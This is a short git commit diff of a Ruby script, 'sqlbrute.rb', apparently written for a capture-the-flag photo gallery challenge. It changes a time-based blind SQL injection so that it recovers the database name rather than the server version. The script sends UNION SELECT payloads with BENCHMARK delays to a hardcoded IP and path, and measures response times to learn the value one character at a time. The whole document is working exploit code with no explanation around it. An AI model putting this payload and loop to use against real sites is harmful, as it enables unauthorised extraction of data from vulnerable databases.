4c291eef1586d21b64635f08a8f7145d87f0554c
l4t1n0 <l4t1n0.sec@gmail.com>
2020-05-10 14:27:21 -0300

    getting the database name

--- photo_galery/sqlbrute.rb
+++ photo_galery/sqlbrute.rb
@@ -4,12 +4,12 @@ require 'benchmark'
 require 'pry'
 
 url = "35.227.24.107"
-character = "abcdefghijklmnopqrstuvyxwzABCDEFGHIJKLMNOPQRSTUVYXWZ0123456789."
+character = "abcdefghijklmnopqrstuvyxwzABCDEFGHIJKLMNOPQRSTUVYXWZ0123456789-."
 result = ""
 placement = 1
 while 1
     for char in character.split('')
-        payload = CGI.escape("1 UNION SELECT IF(SUBSTRING(@@version,#{placement.to_s},1)='#{char}',BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),'NO')")
+        payload = CGI.escape("1 UNION SELECT IF(SUBSTRING(database(),#{placement.to_s},1)='#{char}',BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),'NO')")
         param = "/89b3f8bfae/fetch?id=#{payload}"
         time = Benchmark.measure do 
             response = Net::HTTP.get(url, param)
